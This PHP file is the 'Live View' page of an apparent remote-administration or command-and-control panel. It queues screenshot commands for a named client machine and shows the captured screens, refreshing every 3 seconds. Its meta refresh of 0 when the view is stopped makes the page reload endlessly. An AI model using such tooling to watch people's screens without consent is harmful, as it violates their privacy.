<?php
// Live View - Auto-refreshing screenshot stream
session_start();

if(!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    header('Location: index.php');
    exit;
}

// Database configuration - PostgreSQL (Neon)
$db_host = getenv('PGHOST');
$db_name = getenv('PGDATABASE');
$db_user = getenv('PGUSER');
$db_pass = getenv('PGPASSWORD');

try {
    $pdo = new PDO("pgsql:host=$db_host;dbname=$db_name", $db_user, $db_pass);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch(PDOException $e) {
    die("Database connection failed!");
}

$client_id_param = isset($_GET['client_id']) ? $_GET['client_id'] : '';

if(empty($client_id_param)) {
    die("No client specified");
}

// Get client info
$stmt = $pdo->prepare("SELECT * FROM clients WHERE id = ?");
$stmt->execute([$client_id_param]);
$client = $stmt->fetch(PDO::FETCH_ASSOC);

if(!$client) {
    die("Client not found!");
}

// Handle command submission (start/stop live view)
if(isset($_POST['action'])) {
    $action = $_POST['action'];
    
    if($action == 'start') {
        // Send screenshot command
        $stmt = $pdo->prepare("INSERT INTO commands (client_id, command_type, command_data, status, created_at) VALUES (?, 'screenshot', '', 'pending', NOW())");
        $stmt->execute([$client['client_id']]);
        $message = "Live view started - screenshot requested";
    }
    else if($action == 'stop') {
        // Delete any pending screenshot commands
        $stmt = $pdo->prepare("DELETE FROM commands WHERE client_id = ? AND command_type = 'screenshot' AND status = 'pending'");
        $stmt->execute([$client['client_id']]);
        $message = "Live view stopped";
    }
}

// Get latest screenshot
$stmt = $pdo->prepare("SELECT result, completed_at FROM commands WHERE client_id = ? AND command_type = 'screenshot' AND status = 'completed' AND result LIKE 'SCREENSHOT:%' ORDER BY completed_at DESC LIMIT 1");
$stmt->execute([$client['client_id']]);
$latest_screenshot = $stmt->fetch(PDO::FETCH_ASSOC);

// Check if there's a pending screenshot command
$stmt = $pdo->prepare("SELECT COUNT(*) FROM commands WHERE client_id = ? AND command_type = 'screenshot' AND status IN ('pending', 'executing')");
$stmt->execute([$client['client_id']]);
$pending_count = $stmt->fetchColumn();

$is_live = $pending_count > 0;
?>
<!DOCTYPE html>
<html>
<head>
    <title>Live View - <?= htmlspecialchars($client['computer_name']) ?></title>
    <meta http-equiv="refresh" content="<?= $is_live ? '3' : '0' ?>">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0e27; color: #eee; padding: 20px; }
        .header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 20px; border-radius: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; }
        .back-btn { background: #3282b8; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; text-decoration: none; }
        .controls { background: #16213e; padding: 20px; border-radius: 10px; margin-bottom: 20px; display: flex; gap: 15px; align-items: center; }
        .btn { background: #3282b8; color: white; padding: 12px 24px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
        .btn-start { background: #51cf66; }
        .btn-stop { background: #ff6b6b; }
        .btn:hover { opacity: 0.8; }
        .status { padding: 10px 20px; background: #0f4c75; border-radius: 5px; font-weight: bold; }
        .status.live { background: #51cf66; color: #000; animation: pulse 2s infinite; }
        .status.stopped { background: #ff6b6b; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.6; } }
        .viewer { background: #16213e; padding: 20px; border-radius: 10px; text-align: center; }
        .viewer img { max-width: 100%; height: auto; border: 2px solid #0f4c75; border-radius: 5px; box-shadow: 0 0 20px rgba(0,0,0,0.5); }
        .info { background: #0f4c75; padding: 15px; border-radius: 5px; margin-bottom: 15px; display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; }
        .info-item { text-align: center; }
        .info-item label { display: block; color: #aaa; font-size: 0.9em; margin-bottom: 5px; }
        .info-item value { display: block; font-size: 1.2em; font-weight: bold; color: #51cf66; }
        .no-screenshot { padding: 60px; text-align: center; color: #666; font-size: 1.2em; }
        .loading { text-align: center; padding: 40px; }
        .loading::after { content: '⏳ Loading...'; animation: blink 1.5s infinite; }
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
        .instructions { background: #0f4c75; padding: 15px; border-radius: 5px; margin-bottom: 15px; }
        .instructions ul { margin-left: 20px; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🎥 Live View: <?= htmlspecialchars($client['computer_name']) ?></h1>
        <a href="view_client.php?id=<?= $client['id'] ?>" class="back-btn">← Back to Client</a>
    </div>
    
    <?php if(isset($message)): ?>
        <div class="info" style="background: #51cf66; color: #000;">
            <div><?= htmlspecialchars($message) ?></div>
        </div>
    <?php endif; ?>
    
    <div class="controls">
        <form method="POST" style="display: inline;">
            <input type="hidden" name="action" value="start">
            <button type="submit" class="btn btn-start">▶️ Start Live View</button>
        </form>
        
        <form method="POST" style="display: inline;">
            <input type="hidden" name="action" value="stop">
            <button type="submit" class="btn btn-stop">⏹️ Stop Live View</button>
        </form>
        
        <div class="status <?= $is_live ? 'live' : 'stopped' ?>">
            <?= $is_live ? '🔴 LIVE' : '⚫ STOPPED' ?>
        </div>
        
        <?php if($is_live): ?>
            <div style="color: #51cf66;">
                📡 Auto-refreshing every 3 seconds...
            </div>
        <?php endif; ?>
    </div>
    
    <?php if(!$is_live && !$latest_screenshot): ?>
        <div class="instructions">
            <h3>📋 How to use Live View:</h3>
            <ul>
                <li>Click <strong>"Start Live View"</strong> to begin capturing screenshots</li>
                <li>The page will automatically refresh every 3 seconds</li>
                <li>New screenshots will appear as they're captured</li>
                <li>Click <strong>"Stop Live View"</strong> when done</li>
            </ul>
            <p style="margin-top: 10px; color: #ffd43b;">
                ⚠️ Note: Large screenshots may take 5-30 seconds to upload depending on connection speed.
            </p>
        </div>
    <?php endif; ?>
    
    <div class="viewer">
        <?php if($latest_screenshot): ?>
            <div class="info">
                <div class="info-item">
                    <label>Last Updated</label>
                    <value><?= date('Y-m-d H:i:s', strtotime($latest_screenshot['completed_at'])) ?></value>
                </div>
                <div class="info-item">
                    <label>Screenshot Size</label>
                    <value><?= number_format(strlen($latest_screenshot['result']) * 3 / 4 / 1024 / 1024, 2) ?> MB</value>
                </div>
                <div class="info-item">
                    <label>Client</label>
                    <value><?= htmlspecialchars($client['computer_name']) ?></value>
                </div>
                <div class="info-item">
                    <label>Status</label>
                    <value style="color: <?= $is_live ? '#51cf66' : '#ff6b6b' ?>">
                        <?= $is_live ? 'Updating...' : 'Paused' ?>
                    </value>
                </div>
            </div>
            
            <?php
                $screenshot_data = $latest_screenshot['result'];
                if (strpos($screenshot_data, 'SCREENSHOT:') === 0) {
                    $screenshot_data = substr($screenshot_data, 11);
                }
            ?>
            
            <img src="data:image/bmp;base64,<?= htmlspecialchars($screenshot_data) ?>" alt="Live View">
            
            <a href="data:image/bmp;base64,<?= htmlspecialchars($screenshot_data) ?>" download="screenshot_<?= date('Y-m-d_H-i-s') ?>.bmp" class="btn" style="margin-top: 15px; background: #51cf66;">
                💾 Download Current Frame
            </a>
            
        <?php elseif($is_live): ?>
            <div class="loading">
                <p style="font-size: 1.5em; margin-bottom: 20px;">⏳ Waiting for screenshot...</p>
                <p>The client will capture and upload a screenshot shortly.</p>
                <p style="color: #666; margin-top: 10px;">This page refreshes automatically every 3 seconds.</p>
            </div>
            
        <?php else: ?>
            <div class="no-screenshot">
                <p style="font-size: 2em; margin-bottom: 20px;">📷</p>
                <p>No screenshots yet.</p>
                <p style="color: #666; margin-top: 10px;">Click "Start Live View" to begin.</p>
            </div>
        <?php endif; ?>
    </div>
    
    <script>
        // Show notification when page is about to refresh
        <?php if($is_live): ?>
        setInterval(function() {
            document.title = "🔴 Refreshing... - <?= htmlspecialchars($client['computer_name']) ?>";
        }, 2500);
        <?php endif; ?>
    </script>
</body>
</html>
